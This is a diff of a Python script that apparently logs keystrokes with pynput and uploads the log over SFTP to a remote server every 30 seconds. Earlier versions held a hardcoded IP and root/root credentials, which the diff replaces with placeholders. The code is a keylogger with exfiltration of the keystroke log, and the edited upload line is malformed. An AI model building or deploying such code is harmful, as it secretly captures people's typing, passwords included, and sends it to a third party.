@@ -1,4 +1,4 @@
-importimport paramiko
+import paramiko
 import os
 import  time
 from pynput.keyboard import Key,Listener
@@ -46,14 +46,14 @@ while True:
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    client.connect('192.168.138.128', username='root', password='root', key_filename='log.txt')
+    client.connect('ip adress', username='<User Name>', password='', key_filename='<.PEM File path')
 
     # Setup sftp connection and transmit this script
     print("copying")
 
     sftp = client.open_sftp()
-    sftp.put( "192.168.138.128", "/root/log.txt")
+    sftp.put( "< Source >," " < Destination >")
 
 
     sftp.close()
-    time.sleep(1 - ((time.time() - starttime) % 10.0))
+    time.sleep(30.0 - ((time.time() - starttime) % 30.0))
